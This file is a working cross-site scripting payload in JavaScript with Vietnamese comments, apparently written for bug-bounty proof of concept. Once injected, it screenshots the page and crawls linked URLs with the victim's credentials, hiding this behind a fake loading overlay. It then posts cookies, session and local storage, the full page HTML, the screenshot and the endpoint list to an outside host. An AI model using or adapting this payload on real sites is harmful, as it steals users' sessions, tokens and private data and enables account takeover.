// Import thư viện html2canvas từ CDN
const script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';
document.head.appendChild(script);

// Khởi tạo biến để lưu base64 image
let base64image;
let allEndpoints = new Set(); // Sử dụng Set để tránh trùng lặp
let visitedEndpoints = new Set(); // Giữ track các endpoint đã thăm
let collectedEndpoints = []; // Biến để lưu trữ tất cả các endpoint cuối cùng

function extractHrefs(html) {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const hrefs = Array.from(doc.querySelectorAll('a'))
        .map(a => a.href)
        .filter(href => href.startsWith('http'));
    return hrefs;
}

function sendRequest(url) {
    if (visitedEndpoints.has(url)) {
        return Promise.resolve();
    }
    visitedEndpoints.add(url);

    return fetch(url, {
        method: 'GET',
        credentials: 'include' // Gửi cookie cùng với request, nếu cần
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Network response was not ok for ${url}`);
        }
        return response.text();
    })
    .then(data => {
        const hrefs = extractHrefs(data);
        hrefs.forEach(href => allEndpoints.add(href));

        // Tiếp tục đệ quy với các href mới thu thập được
        return Promise.all(hrefs.map(sendRequest));
    })
    .catch(error => {
        console.error(`There has been a problem with your fetch operation for ${url}:`, error);
    });
}

// Chụp màn hình khi thư viện html2canvas đã được tải xong
script.onload = function() {
    // Chụp màn hình của toàn bộ tài liệu HTML
    html2canvas(document.documentElement).then(canvas => {
        // Chuyển đổi canvas thành base64 image
        base64image = canvas.toDataURL("image/png");

        // Create loading overlay element
        const loadingOverlay = document.createElement('div');
        loadingOverlay.style.position = 'fixed';
        loadingOverlay.style.top = 0;
        loadingOverlay.style.left = 0;
        loadingOverlay.style.right = 0;
        loadingOverlay.style.bottom = 0;
        loadingOverlay.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loadingOverlay.style.display = 'flex';
        loadingOverlay.style.alignItems = 'center';
        loadingOverlay.style.justifyContent = 'center';
        loadingOverlay.style.zIndex = 9999;

        // Create loading content element
        const loadingContent = document.createElement('div');
        loadingContent.style.textAlign = 'center';

        // Create spinner element
        const spinner = document.createElement('div');
        spinner.style.border = '4px solid rgba(0, 0, 0, 0.1)';
        spinner.style.borderLeftColor = '#000';
        spinner.style.borderRadius = '50%';
        spinner.style.width = '40px';
        spinner.style.height = '40px';
        spinner.style.animation = 'spin 1s linear infinite';
        spinner.style.marginBottom = '10px';

        // Create style element for spinner animation
        const style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);

        // Create loading text element
        const loadingText = document.createElement('p');
        loadingText.innerText = 'Loading data, please wait...';

        // Append spinner and text to loading content
        loadingContent.appendChild(spinner);
        loadingContent.appendChild(loadingText);

        // Append loading content to loading overlay
        loadingOverlay.appendChild(loadingContent);

        // Append loading overlay to body
        document.body.appendChild(loadingOverlay);

        // Bắt đầu quá trình đệ quy với URL đầu tiên
        const initialUrl = window.location.href;
        allEndpoints.add(initialUrl);

        sendRequest(initialUrl)
        .then(() => {
            // Lưu kết quả vào biến collectedEndpoints
            collectedEndpoints = Array.from(allEndpoints);
            console.log('All requests completed');

            // Tạo nội dung tin nhắn với base64 image
            var msg = 'VULNERABLE URL\n' + '';
            msg += '\n\nTRIGGER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.URL + '\n\nUSER AGENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + navigator.userAgent;
            msg += '\n\nREFERRER URL\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.referrer + '\n\nREADABLE COOKIES\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.cookie;
            msg += '\n\nSESSION STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(localStorage); 
            msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
            msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
            msg += '\n\nENDPOINT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + collectedEndpoints.join('\n');

            // Gửi tin nhắn qua XMLHttpRequest
            var r = new XMLHttpRequest();
            var mailer = 'https://knoxss.me/00';
            r.open('POST', mailer, true);
            r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
            console.log('Mission completed!');
            alert('XSS weep2609 - Bug Bounty');//
            alert('Mission Completed !');//
        })
        .catch(error => {
            console.error('Error in processing:', error);
        })
        .finally(() => {
            // Hide the loading overlay
            loadingOverlay.style.display = 'none';
        });
    });
};
